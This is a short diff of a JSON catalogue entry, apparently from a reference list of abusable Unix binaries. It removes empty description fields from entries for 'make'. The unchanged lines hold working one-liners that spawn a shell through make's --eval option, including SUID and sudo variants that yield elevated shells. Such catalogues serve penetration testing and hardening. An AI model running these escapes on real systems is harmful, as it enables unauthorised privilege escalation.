@@ -2,7 +2,7 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "COMMAND='/bin/sh'\nmake -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
       }
     ],
@@ -14,13 +14,13 @@
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
       }
     ]
